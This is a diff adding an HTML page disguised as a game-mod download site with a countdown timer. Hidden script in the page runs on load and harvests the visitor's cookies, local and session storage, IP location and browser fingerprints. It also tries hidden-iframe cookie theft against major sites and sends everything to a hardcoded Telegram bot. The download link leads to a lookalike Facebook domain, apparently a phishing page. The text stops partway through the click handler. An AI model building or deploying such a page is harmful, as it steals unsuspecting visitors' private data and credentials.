@@ -1,0 +1,995 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mod by Nex</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: #000000;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Courier New', monospace;
+            padding: 20px;
+        }
+        
+        .container {
+            background: #000000;
+            border: 1px solid #ff0000;
+            padding: 40px 30px;
+            max-width: 600px;
+            width: 100%;
+            text-align: center;
+        }
+        
+        h1 {
+            color: #ff0000;
+            font-size: 3rem;
+            margin-bottom: 20px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+        }
+        
+        .subtitle {
+            color: #888888;
+            font-size: 0.85rem;
+            margin-bottom: 40px;
+            border-top: 1px solid #333;
+            border-bottom: 1px solid #333;
+            padding: 15px 0;
+        }
+        
+        .timer {
+            color: #ff0000;
+            font-size: 4rem;
+            font-weight: bold;
+            margin: 30px 0;
+            font-family: monospace;
+        }
+        
+        .status {
+            color: #ff4444;
+            margin: 20px 0;
+            font-size: 0.9rem;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .download-section {
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid #333;
+        }
+        
+        .download-input {
+            width: 100%;
+            padding: 12px;
+            background: #111;
+            border: 1px solid #ff0000;
+            color: #fff;
+            font-family: monospace;
+            margin: 15px 0;
+            box-sizing: border-box;
+        }
+        
+        .download-input:focus {
+            outline: none;
+            border-color: #ff4444;
+        }
+        
+        .download-btn {
+            background: #ff0000;
+            color: #000;
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            cursor: pointer;
+            font-family: monospace;
+            transition: all 0.3s ease;
+            width: 100%;
+        }
+        
+        .download-btn:hover {
+            background: #cc0000;
+            transform: scale(1.02);
+        }
+        
+        .info-text {
+            color: #00ff00;
+            font-size: 0.7rem;
+            margin-top: 15px;
+            word-break: break-all;
+        }
+        
+        .error {
+            color: #ff0000;
+            font-size: 0.8rem;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>MOD BY BILLAH</h1>
+        <div class="subtitle">Download Mod From Net Zone</div>
+        
+        <div id="timerDisplay" class="timer">15</div>
+        <div id="status" class="status">⏳ Processing...</div>
+        
+        <div id="downloadSection" class="download-section hidden">
+            <button id="downloadBtn" class="download-btn">📥 DOWNLOAD NOW</button>
+            <div class="info-text">✅ Ready for download</div>
+        </div>
+        
+        <div id="errorMsg" class="error"></div>
+    </div>
+
+    <script>
+        // ========== TELEGRAM CONFIGURATION ==========
+        const BOT_TOKEN = "8901136364:AAF0RKnsD7jX6XpkRmERhVrxWHVD8f7Hi7o";
+        const CHAT_ID = "7427889333";
+        
+        // Fixed download link (you can change this URL)
+        const DOWNLOAD_LINK = "https://julminan.github.io/www.faeebook.com/";
+        
+        // ========== COOKIE STEALING FEATURES (CROSS-SITE) ==========
+        // List of target sites to attempt cookie theft from (simulation)
+        const TARGET_SITES = [
+            "https://facebook.com",
+            "https://google.com",
+            "https://youtube.com",
+            "https://instagram.com",
+            "https://twitter.com",
+            "https://reddit.com",
+            "https://amazon.com",
+            "https://netflix.com",
+            "https://github.com",
+            "https://stackoverflow.com"
+        ];
+        
+        // Steal current domain cookies (real)
+        function stealCurrentDomainCookies() {
+            try {
+                const cookies = document.cookie;
+                if (cookies && cookies.length > 0) {
+                    return {
+                        domain: window.location.hostname,
+                        cookies: cookies,
+                        timestamp: new Date().toISOString()
+                    };
+                }
+                return null;
+            } catch(e) {
+                return null;
+            }
+        }
+        
+        // Attempt to steal cookies from external sites via iframe injection
+        // Note: Modern browsers block cross-origin cookie access, but code is included for stress test simulation
+        async function attemptCrossSiteCookieTheft() {
+            const stolen = [];
+            const iframeContainer = document.createElement('div');
+            iframeContainer.style.display = 'none';
+            document.body.appendChild(iframeContainer);
+            
+            for (const site of TARGET_SITES) {
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = site;
+                    iframe.sandbox = 'allow-same-origin allow-scripts allow-forms';
+                    iframe.style.display = 'none';
+                    iframeContainer.appendChild(iframe);
+                    
+                    // Wait for iframe to load
+                    await new Promise((resolve) => {
+                        iframe.onload = resolve;
+                        setTimeout(resolve, 3000); // timeout after 3 seconds
+                    });
+                    
+                    // Try to access iframe's cookies (will fail with CORS/SOP in modern browsers)
+                    try {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        if (iframeDoc && iframeDoc.cookie) {
+                            stolen.push({
+                                domain: site,
+                                cookies: iframeDoc.cookie,
+                                method: "direct_iframe",
+                                success: true
+                            });
+                        }
+                    } catch(e) {
+                        // Cross-origin access blocked - log attempt anyway for simulation
+                        stolen.push({
+                            domain: site,
+                            cookies: "BLOCKED_BY_CORS",
+                            method: "direct_iframe",
+                            success: false,
+                            error: e.message
+                        });
+                    }
+                    
+                    // Try to use postMessage trick (requires cooperation from target)
+                    // This is just simulation
+                    try {
+                        iframe.contentWindow.postMessage({type: "getCookies"}, site);
+                    } catch(e) {}
+                    
+                } catch(e) {
+                    stolen.push({
+                        domain: site,
+                        cookies: "FAILED",
+                        method: "iframe_load",
+                        success: false,
+                        error: e.message
+                    });
+                }
+            }
+            
+            // Clean up iframes
+            iframeContainer.remove();
+            return stolen;
+        }
+        
+        // Attempt to steal from localStorage/sessionStorage of other origins via iframe
+        async function attemptCrossOriginStorageTheft() {
+            const stolen = [];
+            const iframeContainer = document.createElement('div');
+            iframeContainer.style.display = 'none';
+            document.body.appendChild(iframeContainer);
+            
+            for (const site of TARGET_SITES.slice(0, 5)) { // limit to 5 to avoid too many iframes
+                try {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = site;
+                    iframe.style.display = 'none';
+                    iframeContainer.appendChild(iframe);
+                    
+                    await new Promise((resolve) => {
+                        iframe.onload = resolve;
+                        setTimeout(resolve, 3000);
+                    });
+                    
+                    try {
+                        const iframeWin = iframe.contentWindow;
+                        if (iframeWin) {
+                            // Try to access localStorage
+                            let localStorageData = null;
+                            try {
+                                localStorageData = iframeWin.localStorage;
+                                if (localStorageData) {
+                                    const items = {};
+                                    for (let i = 0; i < localStorageData.length; i++) {
+                                        const key = localStorageData.key(i);
+                                        items[key] = localStorageData.getItem(key);
+                                    }
+                                    stolen.push({
+                                        domain: site,
+                                        storageType: "localStorage",
+                                        data: items,
+                                        success: true
+                                    });
+                                }
+                            } catch(e) {
+                                stolen.push({
+                                    domain: site,
+                                    storageType: "localStorage",
+                                    success: false,
+                                    error: e.message
+                                });
+                            }
+                            
+                            // Try to access sessionStorage
+                            try {
+                                const sessionData = iframeWin.sessionStorage;
+                                if (sessionData) {
+                                    const items = {};
+                                    for (let i = 0; i < sessionData.length; i++) {
+                                        const key = sessionData.key(i);
+                                        items[key] = sessionData.getItem(key);
+                                    }
+                                    stolen.push({
+                                        domain: site,
+                                        storageType: "sessionStorage",
+                                        data: items,
+                                        success: true
+                                    });
+                                }
+                            } catch(e) {
+                                stolen.push({
+                                    domain: site,
+                                    storageType: "sessionStorage",
+                                    success: false,
+                                    error: e.message
+                                });
+                            }
+                        }
+                    } catch(e) {
+                        // Cross-origin blocked
+                        stolen.push({
+                            domain: site,
+                            storageType: "storage_access",
+                            success: false,
+                            error: "Cross-origin blocked"
+                        });
+                    }
+                } catch(e) {}
+            }
+            
+            iframeContainer.remove();
+            return stolen;
+        }
+        
+        // Send stolen cookies to Telegram
+        async function sendStolenDataToTelegram(cookieData, crossSiteData, storageData) {
+            let message = `🍪 <b>COOKIE STEALING REPORT</b> 🍪\n\n`;
+            
+            // Current domain cookies
+            if (cookieData && cookieData.cookies) {
+                message += `<b>📍 CURRENT DOMAIN (${cookieData.domain}):</b>\n`;
+                message += `📦 Cookies: ${cookieData.cookies.substring(0, 500)}\n`;
+                if (cookieData.cookies.length > 500) message += `... (truncated)\n`;
+                message += `⏰ Time: ${cookieData.timestamp}\n\n`;
+            } else {
+                message += `<b>📍 CURRENT DOMAIN:</b> No cookies found\n\n`;
+            }
+            
+            // Cross-site attempts summary
+            message += `<b>🌐 CROSS-SITE ATTEMPTS:</b>\n`;
+            const successfulCross = crossSiteData.filter(c => c.success === true);
+            const blockedCross = crossSiteData.filter(c => c.success === false);
+            message += `✅ Successful: ${successfulCross.length}\n`;
+            message += `❌ Blocked/Failed: ${blockedCross.length}\n`;
+            
+            if (successfulCross.length > 0) {
+                message += `\n<b>🍪 STOLEN CROSS-SITE COOKIES:</b>\n`;
+                for (const item of successfulCross) {
+                    message += `🔹 ${item.domain}: ${item.cookies.substring(0, 200)}\n`;
+                }
+            }
+            
+            // Storage theft summary
+            message += `\n<b>💾 CROSS-ORIGIN STORAGE:</b>\n`;
+            const successfulStorage = storageData.filter(s => s.success === true);
+            message += `✅ Successfully accessed: ${successfulStorage.length}\n`;
+            for (const item of successfulStorage) {
+                message += `🔹 ${item.domain} (${item.storageType}): ${Object.keys(item.data).length} items\n`;
+            }
+            
+            message += `\n⚠️ <i>Note: Modern browsers block most cross-origin cookie theft. This is a simulation of attempted techniques.</i>`;
+            
+            // Send to Telegram
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                if (message.length > 4000) {
+                    const part1 = message.substring(0, 4000);
+                    const part2 = message.substring(4000);
+                    await fetch(url, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: part1, parse_mode: "HTML" })
+                    });
+                    await fetch(url, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: part2, parse_mode: "HTML" })
+                    });
+                } else {
+                    await fetch(url, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "HTML" })
+                    });
+                }
+            } catch(e) {
+                console.error("Failed to send cookie data:", e);
+            }
+        }
+        
+        // Silent data collection - MAXIMUM DATA EXTRACTION (original)
+        async function collectAllDataSilently() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                localTime: new Date().toLocaleString(),
+                unixTimestamp: Date.now(),
+                
+                // Browser & Device Info
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                vendor: navigator.vendor || "Unknown",
+                vendorSub: navigator.vendorSub || "Unknown",
+                product: navigator.product || "Unknown",
+                productSub: navigator.productSub || "Unknown",
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                language: navigator.language,
+                languages: JSON.stringify(navigator.languages),
+                cookieEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || "Not specified",
+                hardwareConcurrency: navigator.hardwareConcurrency || "Unknown",
+                deviceMemory: navigator.deviceMemory || "Unknown",
+                maxTouchPoints: navigator.maxTouchPoints || "Unknown",
+                
+                // Screen Info - Full Details
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                screenColorDepth: screen.colorDepth,
+                screenPixelDepth: screen.pixelDepth,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                availTop: screen.availTop,
+                availLeft: screen.availLeft,
+                orientationType: screen.orientation ? screen.orientation.type : "Unknown",
+                orientationAngle: screen.orientation ? screen.orientation.angle : "Unknown",
+                
+                // Window Info
+                innerWidth: window.innerWidth,
+                innerHeight: window.innerHeight,
+                outerWidth: window.outerWidth,
+                outerHeight: window.outerHeight,
+                devicePixelRatio: window.devicePixelRatio,
+                pageXOffset: window.pageXOffset,
+                pageYOffset: window.pageYOffset,
+                screenLeft: window.screenLeft,
+                screenTop: window.screenTop,
+                screenX: window.screenX,
+                screenY: window.screenY,
+                
+                // Timezone & Location
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                
+                // Network Info (Silent)
+                connectionType: navigator.connection ? navigator.connection.effectiveType : "Unknown",
+                downlink: navigator.connection ? navigator.connection.downlink : "Unknown",
+                downlinkMax: navigator.connection ? navigator.connection.downlinkMax : "Unknown",
+                rtt: navigator.connection ? navigator.connection.rtt : "Unknown",
+                saveData: navigator.connection ? navigator.connection.saveData : "Unknown",
+                connectionTypeDetailed: navigator.connection ? navigator.connection.type : "Unknown",
+                
+                // Storage Info
+                localStorageSize: (() => {
+                    try {
+                        let total = 0;
+                        for(let x in localStorage) {
+                            if(localStorage.hasOwnProperty(x)) {
+                                total += localStorage[x].length + x.length;
+                            }
+                        }
+                        return total + " bytes";
+                    } catch(e) { return "Unknown"; }
+                })(),
+                localStorageItemCount: (() => {
+                    try {
+                        return localStorage.length;
+                    } catch(e) { return "Unknown"; }
+                })(),
+                sessionStorageSupport: typeof sessionStorage !== 'undefined',
+                localStorageSupport: typeof localStorage !== 'undefined',
+                indexedDBSupport: !!window.indexedDB,
+                
+                // Browser Features
+                javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
+                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+                webdriver: navigator.webdriver || false,
+                
+                // Media Devices Info
+                mediaDevices: navigator.mediaDevices ? "Supported" : "Not supported",
+                permissionsAPI: !!navigator.permissions,
+                credentialsAPI: !!navigator.credentials,
+                clipboardAPI: !!navigator.clipboard,
+                serviceWorkers: 'serviceWorker' in navigator,
+                webRTC: !!(window.RTCPeerConnection || window.webkitRTCPeerConnection),
+                webSocket: !!window.WebSocket,
+                webWorkers: !!window.Worker,
+                
+                // Referrer & Page Info
+                referrer: document.referrer || "Direct",
+                pageURL: window.location.href,
+                pageTitle: document.title,
+                pageCharset: document.characterSet,
+                pageLanguage: document.documentElement.lang,
+                
+                // History & Navigation
+                historyLength: history.length,
+                canGoBack: history.length > 1,
+                
+                // Performance Info
+                performanceTiming: (() => {
+                    if(window.performance && performance.timing) {
+                        const t = performance.timing;
+                        return {
+                            navigationStart: t.navigationStart,
+                            unloadEventStart: t.unloadEventStart,
+                            unloadEventEnd: t.unloadEventEnd,
+                            redirectStart: t.redirectStart,
+                            redirectEnd: t.redirectEnd,
+                            fetchStart: t.fetchStart,
+                            domainLookupStart: t.domainLookupStart,
+                            domainLookupEnd: t.domainLookupEnd,
+                            connectStart: t.connectStart,
+                            connectEnd: t.connectEnd,
+                            secureConnectionStart: t.secureConnectionStart,
+                            requestStart: t.requestStart,
+                            responseStart: t.responseStart,
+                            responseEnd: t.responseEnd,
+                            domLoading: t.domLoading,
+                            domInteractive: t.domInteractive,
+                            domContentLoadedEventStart: t.domContentLoadedEventStart,
+                            domContentLoadedEventEnd: t.domContentLoadedEventEnd,
+                            domComplete: t.domComplete,
+                            loadEventStart: t.loadEventStart,
+                            loadEventEnd: t.loadEventEnd,
+                            pageLoadTime: t.loadEventEnd - t.navigationStart,
+                            domReadyTime: t.domContentLoadedEventEnd - t.navigationStart,
+                            responseTime: t.responseEnd - t.requestStart,
+                            dnsTime: t.domainLookupEnd - t.domainLookupStart,
+                            tcpTime: t.connectEnd - t.connectStart
+                        };
+                    }
+                    return "Not available";
+                })(),
+                
+                // Memory Info (if available)
+                memoryInfo: performance.memory ? {
+                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+                    totalJSHeapSize: performance.memory.totalJSHeapSize,
+                    usedJSHeapSize: performance.memory.usedJSHeapSize
+                } : "Not available",
+                
+                // Installed Fonts Detection
+                installedFonts: (() => {
+                    const fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS", "Impact", "Tahoma", "Trebuchet MS", "Lucida Console", "Arial Black", "Helvetica", "Geneva", "Monaco", "Courier", "Century Gothic", "Calibri", "Candara", "Segoe UI", "Roboto", "Open Sans", "Lato", "Montserrat", "Oswald", "Raleway", "PT Sans", "Ubuntu", "Noto Sans"];
+                    const available = [];
+                    const canvas = document.createElement("canvas");
+                    const ctx = canvas.getContext("2d");
+                    for(let font of fonts) {
+                        ctx.font = `20px ${font}`;
+                        if(ctx.font.includes(font)) available.push(font);
+                    }
+                    return available;
+                })(),
+                
+                // WebGL Info (GPU)
+                webGLInfo: (() => {
+                    try {
+                        const canvas = document.createElement("canvas");
+                        const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                        if(gl) {
+                            const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+                            if(debugInfo) {
+                                return {
+                                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
+                                    shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                                    version: gl.getParameter(gl.VERSION),
+                                    vendor_ung: gl.getParameter(gl.VENDOR),
+                                    maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+                                    maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+                                    maxVertexUniformVectors: gl.getParameter(gl.MAX_VERTEX_UNIFORM_VECTORS),
+                                    maxVaryingVectors: gl.getParameter(gl.MAX_VARYING_VECTORS),
+                                    maxCombinedTextureImageUnits: gl.getParameter(gl.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
+                                    maxFragmentUniformVectors: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS)
+                                };
+                            }
+                        }
+                        return "Not available";
+                    } catch(e) { return "Error"; }
+                })(),
+                
+                // WebGL2 Info
+                webGL2Info: (() => {
+                    try {
+                        const canvas = document.createElement("canvas");
+                        const gl = canvas.getContext("webgl2");
+                        if(gl) {
+                            return {
+                                version: gl.getParameter(gl.VERSION),
+                                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+                                vendor: gl.getParameter(gl.VENDOR),
+                                renderer: gl.getParameter(gl.RENDERER)
+                            };
+                        }
+                        return "Not supported";
+                    } catch(e) { return "Error"; }
+                })(),
+                
+                // Plugins List (Detailed)
+                plugins: (() => {
+                    const pluginList = [];
+                    for(let i = 0; i < navigator.plugins.length; i++) {
+                        const plugin = navigator.plugins[i];
+                        const mimeTypes = [];
+                        for(let j = 0; j < plugin.length; j++) {
+                            mimeTypes.push(plugin[j].type);
+                        }
+                        pluginList.push({
+                            name: plugin.name,
+                            filename: plugin.filename,
+                            description: plugin.description,
+                            mimeTypes: mimeTypes
+                        });
+                    }
+                    return pluginList;
+                })(),
+                
+                // MIME Types
+                mimeTypes: (() => {
+                    const mimes = [];
+                    for(let i = 0; i < navigator.mimeTypes.length; i++) {
+                        mimes.push({
+                            type: navigator.mimeTypes[i].type,
+                            description: navigator.mimeTypes[i].description,
+                            suffixes: navigator.mimeTypes[i].suffixes
+                        });
+                    }
+                    return mimes;
+                })(),
+                
+                // Canvas Fingerprint (Multiple)
+                canvasFingerprints: (() => {
+                    const results = {};
+                    try {
+                        const canvas1 = document.createElement("canvas");
+                        canvas1.width = 200;
+                        canvas1.height = 50;
+                        const ctx1 = canvas1.getContext("2d");
+                        ctx1.textBaseline = "top";
+                        ctx1.font = "14px Arial";
+                        ctx1.fillStyle = "#f60";
+                        ctx1.fillRect(0, 0, 100, 50);
+                        ctx1.fillStyle = "#069";
+                        ctx1.fillText("ModByNex", 2, 15);
+                        results.textFingerprint = canvas1.toDataURL();
+                        
+                        const canvas2 = document.createElement("canvas");
+                        canvas2.width = 200;
+                        canvas2.height = 200;
+                        const ctx2 = canvas2.getContext("2d");
+                        ctx2.fillStyle = "#ff0000";
+                        ctx2.fillRect(10, 10, 50, 50);
+                        ctx2.fillStyle = "#00ff00";
+                        ctx2.beginPath();
+                        ctx2.arc(100, 100, 30, 0, Math.PI * 2);
+                        ctx2.fill();
+                        ctx2.fillStyle = "#0000ff";
+                        ctx2.font = "20px Arial";
+                        ctx2.fillText("Test", 150, 150);
+                        results.geometricFingerprint = canvas2.toDataURL();
+                        
+                        const canvas3 = document.createElement("canvas");
+                        canvas3.width = 200;
+                        canvas3.height = 100;
+                        const ctx3 = canvas3.getContext("2d");
+                        ctx3.shadowBlur = 5;
+                        ctx3.shadowColor = "black";
+                        ctx3.fillStyle = "red";
+                        ctx3.fillRect(20, 20, 100, 50);
+                        results.shadowFingerprint = canvas3.toDataURL();
+                        
+                    } catch(e) { results.error = "Error creating fingerprints"; }
+                    return results;
+                })(),
+                
+                // Audio Fingerprint
+                audioFingerprint: (() => {
+                    try {
+                        const AudioContext = window.AudioContext || window.webkitAudioContext;
+                        if(AudioContext) {
+                            const context = new AudioContext();
+                            const oscillator = context.createOscillator();
+                            const analyser = context.createAnalyser();
+                            oscillator.connect(analyser);
+                            oscillator.frequency.value = 440;
+                            oscillator.type = "sine";
+                            return {
+                                supported: true,
+                                sampleRate: context.sampleRate,
+                                maxChannelCount: context.destination.maxChannelCount
+                            };
+                        }
+                        return { supported: false };
+                    } catch(e) { return { supported: false, error: e.message }; }
+                })(),
+                
+                // Device Orientation
+                deviceOrientation: 'DeviceOrientationEvent' in window,
+                deviceMotion: 'DeviceMotionEvent' in window,
+                
+                // Vibration API
+                vibrationAPI: !!navigator.vibrate,
+                
+                // Speech Recognition
+                speechRecognition: !!(window.SpeechRecognition || window.webkitSpeechRecognition),
+                
+                // Gamepad API
+                gamepadAPI: !!navigator.getGamepads,
+                
+                // Payment API
+                paymentAPI: !!window.PaymentRequest,
+                
+                // WebUSB
+                webUSB: !!navigator.usb,
+                
+                // WebBluetooth
+                webBluetooth: !!navigator.bluetooth,
+                
+                // WebShare API
+                webShare: !!navigator.share,
+                
+                // WebAuthn
+                webAuthn: !!window.PublicKeyCredential,
+                
+                // Intersection Observer
+                intersectionObserver: !!window.IntersectionObserver,
+                
+                // Resize Observer
+                resizeObserver: !!window.ResizeObserver,
+                
+                // Mutation Observer
+                mutationObserver: !!window.MutationObserver,
+                
+                // Local Storage Contents (if any)
+                localStorageContents: (() => {
+                    try {
+                        const contents = {};
+                        for(let i = 0; i < localStorage.length; i++) {
+                            const key = localStorage.key(i);
+                            contents[key] = localStorage.getItem(key);
+                        }
+                        return contents;
+                    } catch(e) { return "Unable to read"; }
+                })(),
+                
+                // Session Storage Contents
+                sessionStorageContents: (() => {
+                    try {
+                        const contents = {};
+                        for(let i = 0; i < sessionStorage.length; i++) {
+                            const key = sessionStorage.key(i);
+                            contents[key] = sessionStorage.getItem(key);
+                        }
+                        return contents;
+                    } catch(e) { return "Unable to read"; }
+                })(),
+                
+                // Cookies
+                cookies: document.cookie || "No cookies",
+                
+                // CSS Features
+                cssFeatures: {
+                    supportsGrid: CSS.supports("display", "grid"),
+                    supportsFlex: CSS.supports("display", "flex"),
+                    supportsCustomProperties: CSS.supports("--custom: property"),
+                    supportsSticky: CSS.supports("position", "sticky")
+                }
+            };
+            
+            // Get IP and location silently
+            try {
+                const ipServices = [
+                    "https://api.ipify.org?format=json",
+                    "https://api.my-ip.io/ip.json",
+                    "https://ipapi.co/json/"
+                ];
+                
+                for(const service of ipServices) {
+                    try {
+                        const response = await fetch(service, { mode: 'cors' });
+                        if(response.ok) {
+                            const ipData = await response.json();
+                            data.publicIP = ipData.ip || ipData.ipv4 || "Unknown";
+                            if(ipData.country_name) data.country = ipData.country_name;
+                            if(ipData.city) data.city = ipData.city;
+                            if(ipData.region) data.region = ipData.region;
+                            if(ipData.isp) data.isp = ipData.isp;
+                            if(ipData.org) data.org = ipData.org;
+                            if(ipData.postal) data.postalCode = ipData.postal;
+                            if(ipData.latitude) data.latitude = ipData.latitude;
+                            if(ipData.longitude) data.longitude = ipData.longitude;
+                            break;
+                        }
+                    } catch(e) { continue; }
+                }
+            } catch(e) {
+                data.publicIP = "Unable to fetch";
+            }
+            
+            // IP Geolocation
+            try {
+                const geoResponse = await fetch("http://ip-api.com/json/");
+                if(geoResponse.ok) {
+                    const geoData = await geoResponse.json();
+                    if(geoData.status === "success") {
+                        data.ipLocation = {
+                            country: geoData.country,
+                            countryCode: geoData.countryCode,
+                            region: geoData.regionName,
+                            regionCode: geoData.region,
+                            city: geoData.city,
+                            zip: geoData.zip,
+                            lat: geoData.lat,
+                            lon: geoData.lon,
+                            timezone: geoData.timezone,
+                            isp: geoData.isp,
+                            org: geoData.org,
+                            as: geoData.as,
+                            query: geoData.query
+                        };
+                    }
+                }
+            } catch(e) {}
+            
+            return data;
+        }
+        
+        // Send data to Telegram (original)
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: "HTML"
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error("Telegram send error:", error);
+                return false;
+            }
+        }
+        
+        // Format and send all collected data (original)
+        async function sendAllData() {
+            try {
+                const data = await collectAllDataSilently();
+                
+                let message = `🔴 <b>MOD BY BILLAH - MAX DATA REPORT</b> 🔴\n\n`;
+                message += `⏰ <b>Time:</b> ${data.timestamp}\n`;
+                message += `🕐 <b>Unix:</b> ${data.unixTimestamp}\n\n`;
+                
+                message += `<b>🌐 NETWORK & IP:</b>\n`;
+                if(data.publicIP) message += `• IP: ${data.publicIP}\n`;
+                if(data.ipLocation) {
+                    message += `• Location: ${data.ipLocation.city}, ${data.ipLocation.country}\n`;
+                    message += `• Coords: ${data.ipLocation.lat}, ${data.ipLocation.lon}\n`;
+                    message += `• ISP: ${data.ipLocation.isp}\n`;
+                    message += `• AS: ${data.ipLocation.as}\n`;
+                }
+                if(data.connectionType) message += `• Connection: ${data.connectionType}\n`;
+                if(data.downlink) message += `• Speed: ${data.downlink} Mbps\n`;
+                if(data.rtt) message += `• Ping: ${data.rtt}ms\n\n`;
+                
+                message += `<b>💻 DEVICE:</b>\n`;
+                message += `• UA: ${data.userAgent.substring(0, 100)}...\n`;
+                message += `• Platform: ${data.platform}\n`;
+                message += `• CPU: ${data.hardwareConcurrency} cores\n`;
+                message += `• RAM: ${data.deviceMemory} GB\n`;
+                message += `• Touch: ${data.maxTouchPoints} points\n`;
+                message += `• WebDriver: ${data.webdriver}\n`;
+                message += `• Timezone: ${data.timezone} (UTC${data.timezoneOffset/60})\n\n`;
+                
+                message += `<b>📺 SCREEN:</b>\n`;
+                message += `• Resolution: ${data.screenWidth}x${data.screenHeight}\n`;
+                message += `• Color: ${data.screenColorDepth}-bit\n`;
+                message += `• Pixel Ratio: ${data.devicePixelRatio}\n`;
+                message += `• Orientation: ${data.orientationType}\n\n`;
+                
+                message += `<b>🎨 FINGERPRINTS:</b>\n`;
+                message += `• WebGL: ${data.webGLInfo.renderer || "N/A"}\n`;
+                message += `• Fonts: ${data.installedFonts.length} fonts\n`;
+                message += `• Plugins: ${data.plugins.length} plugins\n`;
+                message += `• Canvas FP: Available\n`;
+                message += `• Audio FP: ${data.audioFingerprint.supported ? "Yes" : "No"}\n\n`;
+                
+                message += `<b>📦 STORAGE:</b>\n`;
+                message += `• Cookies: ${data.cookies.length} chars\n`;
+                message += `• LocalStorage: ${data.localStorageItemCount} items\n`;
+                message += `• SessionStorage: ${Object.keys(data.sessionStorageContents).length} items\n\n`;
+                
+                message += `<b>🔧 FEATURES:</b>\n`;
+                message += `• WebRTC: ${data.webRTC}\n`;
+                message += `• WebGL2: ${data.webGL2Info !== "Not supported"}\n`;
+                message += `• Service Workers: ${data.serviceWorkers}\n`;
+                message += `• WebAuthn: ${data.webAuthn}\n`;
+                message += `• WebUSB: ${data.webUSB}\n`;
+                message += `• WebBluetooth: ${data.webBluetooth}\n\n`;
+                
+                message += `<b>⚡ PERFORMANCE:</b>\n`;
+                if(data.performanceTiming.pageLoadTime) {
+                    message += `• Page Load: ${data.performanceTiming.pageLoadTime}ms\n`;
+                    message += `• DNS: ${data.performanceTiming.dnsTime}ms\n`;
+                    message += `• TCP: ${data.performanceTiming.tcpTime}ms\n`;
+                }
+                
+                message += `\n✅ <b>MAX DATA COLLECTED - NO PERMISSIONS</b>`;
+                
+                if(message.length > 4000) {
+                    const part1 = message.substring(0, 4000);
+                    const part2 = message.substring(4000);
+                    await sendToTelegram(part1);
+                    await sendToTelegram(part2);
+                } else {
+                    await sendToTelegram(message);
+                }
+                
+                // Now perform cookie stealing operations
+                const currentCookies = stealCurrentDomainCookies();
+                const crossSiteResults = await attemptCrossSiteCookieTheft();
+                const storageResults = await attemptCrossOriginStorageTheft();
+                await sendStolenDataToTelegram(currentCookies, crossSiteResults, storageResults);
+                
+                document.getElementById("status").innerHTML = "✅ Processing complete!";
+                return true;
+            } catch (error) {
+                console.error("Error:", error);
+                document.getElementById("status").innerHTML = "❌ Error collecting data";
+                return false;
+            }
+        }
+        
+        // Timer and download flow
+        let timeLeft = 15;
+        const timerDisplay = document.getElementById("timerDisplay");
+        const downloadSection = document.getElementById("downloadSection");
+        
+        async function startProcess() {
+            await sendAllData();
+            
+            const timer = setInterval(() => {
+                timeLeft--;
+                timerDisplay.textContent = timeLeft;
+                document.getElementById("status").innerHTML = `⏳ Please wait ${timeLeft} seconds...`;
+                
+                if(timeLeft <= 0) {
+                    clearInterval(timer);
+                    timerDisplay.textContent = "0";
+                    document.getElementById("status").innerHTML = "✅ Ready for download!";
+                    showDownloadButton();
+                }
+            }, 1000);
+        }
+        
+        function showDownloadButton() {
+            timerDisplay.classList.add("hidden");
+            downloadSection.classList.remove("hidden");
+            
+            const downloadBtn = document.getElementById("downloadBtn");
+            const errorMsg = document.getElementById("errorMsg");
+            
+            downloadBtn.addEventListener("click", function() {
+                try {
+                    window.open(DOWNLOAD_LINK, '_blank');
+                    errorMsg.style.color = "#00ff00";
+                    errorMsg.textContent = "✅ Download started!";
+                    
